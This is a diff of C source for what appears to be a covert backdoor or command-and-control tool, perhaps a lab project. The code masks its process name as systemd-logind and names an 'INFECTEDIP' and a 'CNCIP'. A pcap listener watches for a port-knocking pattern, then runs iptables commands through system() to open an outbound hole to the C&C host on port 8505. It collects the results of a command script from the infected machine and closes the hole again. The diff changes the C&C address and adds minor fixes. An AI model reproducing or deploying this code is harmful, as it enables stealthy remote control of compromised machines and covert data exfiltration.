@@ -9,8 +9,8 @@
 #define MASK "/usr/lib/systemd/systemd-logind"
 #define CMD "./cmd.sh > results"
 #define CHMOD "chmod 755 cmd.sh"
-#define IPTABLES "iptables -A OUTPUT -p tcp -d 192.168.0.109 --dport 8505 -j ACCEPT"
-#define TURNOFF "iptables -D OUTPUT -p tcp -d 192.168.0.109 --dport 8505 -j ACCEPT"
+#define IPTABLES "iptables -A OUTPUT -p tcp -d 192.168.0.110 --dport 8505 -j ACCEPT"
+#define TURNOFF "iptables -D OUTPUT -p tcp -d 192.168.0.110 --dport 8505 -j ACCEPT"
 #define RESULT_FILE "results"
 #define INFECTEDIP "192.168.0.100"
 #define CNCIP "192.168.0.109"
@@ -191,15 +191,16 @@ void ParseTCP(u_char* args, const struct pcap_pkthdr* pkthdr, const u_char* pack
     printf("PORT KNOCKING ON: %d\n", ntohs(tcp->th_dport));
     if(knock){
         for(int k = 0; k < sizeof(pattern)/sizeof(int); k++){
-            if(pattern[k] == tcp->th_dport){
+            if(pattern[k] == (int)tcp->th_dport){
                 knocking[k] = 1;
             }
         }
     if((knocking[0] == 1) && (knocking[1] == 1)){
-       system(IPTABLES);
+        system(IPTABLES);
         char *dip = INFECTEDIP;
         unsigned short sport = SHPORT;
         unsigned short dport = SHPORT;
+        printf("WAITING FOR DATA\n");
         recv_results(dip, dport);
         system(TURNOFF);
     }
